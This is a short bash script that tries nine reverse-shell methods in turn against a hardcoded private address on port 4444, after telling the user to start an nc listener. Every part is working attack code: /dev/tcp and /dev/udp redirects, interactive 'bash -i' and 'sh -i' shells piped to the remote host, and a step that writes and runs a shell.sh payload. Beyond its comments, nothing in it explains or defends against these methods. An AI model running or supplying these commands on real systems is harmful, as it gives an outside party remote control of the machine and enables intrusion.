#!/bin/bash

IP="10.100.2.3"
PORT="4444"

echo "[*] Make sure you have a listener running: nc -lvnp $PORT"
echo "[*] Reverse shell target: $IP:$PORT"
echo

# Method 1
read -p "[1] Press Enter to run: cat </dev/tcp/$IP/$PORT"
cat </dev/tcp/$IP/$PORT

# Method 2
read -p "[2] Press Enter to run: exec 3<>/dev/tcp/$IP/$PORT"
exec 3<>/dev/tcp/$IP/$PORT
echo "Hello from FD 3" >&3
cat <&3

# Method 3
read -p "[3] Press Enter to run: echo > /dev/tcp/$IP/$PORT"
echo "Quick ping to TCP port" > /dev/tcp/$IP/$PORT

# Method 4
read -p "[4] Press Enter to run: bash -i >& /dev/tcp/$IP/$PORT 0>&1"
bash -i >& /dev/tcp/$IP/$PORT 0>&1

# Method 5
read -p "[5] Press Enter to run: sh -i >& /dev/udp/$IP/$PORT 0>&1"
sh -i >& /dev/udp/$IP/$PORT 0>&1

# Method 6
read -p "[6] Press Enter to run: exec 5<>/dev/tcp/$IP/$PORT"
exec 5<>/dev/tcp/$IP/$PORT
echo "Hello from FD 5" >&5
cat <&5

# Method 7
read -p "[7] Press Enter to run: (sh) 0>/dev/tcp/$IP/$PORT"
(sh) 0>/dev/tcp/$IP/$PORT

# Method 8
read -p "[8] Press Enter to run: bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'"
bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"

# Method 9
read -p "[9] Press Enter to run: create and execute shell.sh"
echo -e "#!/bin/bash\nbash -i >& /dev/tcp/$IP/$PORT 0>&1" > shell.sh
chmod +x shell.sh
./shell.sh
